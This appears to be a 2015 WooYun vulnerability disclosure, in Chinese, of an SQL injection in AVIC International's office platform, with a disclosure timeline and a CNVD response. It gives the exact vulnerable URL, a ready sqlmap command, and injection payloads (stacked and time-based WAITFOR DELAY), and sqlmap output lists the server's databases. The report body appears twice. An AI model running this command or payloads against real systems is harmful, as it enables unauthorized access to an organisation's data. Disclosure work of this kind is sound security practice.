wybug_title: 中航国际某系统存在SQL注入漏洞
wybug_corp: 中国航空技术国际控股有限公司
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-13：	细节已通知厂商并且等待厂商处理中									2015-07-17：	厂商已经确认，细节仅向厂商公开									2015-07-27：	细节向核心白帽子及相关领域专家公开									2015-08-06：	细节向普通白帽子公开									2015-08-16：	细节向实习白帽子公开									2015-08-31：	细节向公众公开  简要描述： 中航国际某系统存在SQL注入漏洞。 详细说明：  中航国际办公平台存在SQL注入漏洞地址：http://bjoa.avic-intl.cn/c6/Jhsoft.Web.login/PassWordNew.aspx注入地址：http://bjoa.avic-intl.cn/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123
python sqlmap.py -u "http://bjoa.avic-intl.cn/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123" --dbms "mssql" --tamper "space2comment.py"  --dbs
<code></sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: FileID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: FileID=123'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: FileID=123' WAITFOR DELAY '0:0:5'-----[22:45:14] [INFO] changes made by tampering scripts are not included in shown payload content(s)[22:45:14] [INFO] testing Microsoft SQL Server[22:45:15] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[22:45:21] [INFO] confirming Microsoft SQL Server[22:45:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[22:45:21] [INFO] fetching database names[22:45:21] [INFO] fetching number of databases[22:45:21] [INFO] resumed: 11[22:45:21] [INFO] resumed: chair_mail[22:45:21] [INFO] resumed: distribution[22:45:21] [INFO] resumed: eBSPortal[22:45:21] [INFO] resumed: master[22:45:21] [INFO] resumed: mimail[22:45:21] [INFO] resumed: model[22:45:21] [INFO] resumed: msdb[22:45:21] [INFO] resumed: other_app[22:45:21] [INFO] resumed: tempdcl[22:45:21] [INFO] resumed: WOA![22:45:21] [INFO] resumed: xz_xhplyavailable databases [11]:[*] [WOA!][*] chair_mail[*] distribution[*] eBSPortal[*] master[*] mimail[*] model[*] msdb[*] other_app[*] tempdcl[*] xz_xhplycode>数据比较多，就不在深入了   漏洞证明：  中航国际办公平台存在SQL注入漏洞地址：http://bjoa.avic-intl.cn/c6/Jhsoft.Web.login/PassWordNew.aspx注入地址：http://bjoa.avic-intl.cn/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123
python sqlmap.py -u "http://bjoa.avic-intl.cn/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123" --dbms "mssql" --tamper "space2comment.py"  --dbs
<code></sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: FileID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: FileID=123'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: FileID=123' WAITFOR DELAY '0:0:5'-----[22:45:14] [INFO] changes made by tampering scripts are not included in shown payload content(s)[22:45:14] [INFO] testing Microsoft SQL Server[22:45:15] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[22:45:21] [INFO] confirming Microsoft SQL Server[22:45:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[22:45:21] [INFO] fetching database names[22:45:21] [INFO] fetching number of databases[22:45:21] [INFO] resumed: 11[22:45:21] [INFO] resumed: chair_mail[22:45:21] [INFO] resumed: distribution[22:45:21] [INFO] resumed: eBSPortal[22:45:21] [INFO] resumed: master[22:45:21] [INFO] resumed: mimail[22:45:21] [INFO] resumed: model[22:45:21] [INFO] resumed: msdb[22:45:21] [INFO] resumed: other_app[22:45:21] [INFO] resumed: tempdcl[22:45:21] [INFO] resumed: WOA![22:45:21] [INFO] resumed: xz_xhplyavailable databases [11]:[*] [WOA!][*] chair_mail[*] distribution[*] eBSPortal[*] master[*] mimail[*] model[*] msdb[*] other_app[*] tempdcl[*] xz_xhplycode>数据比较多，就不在深入了

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-17 11:55 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给北京分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
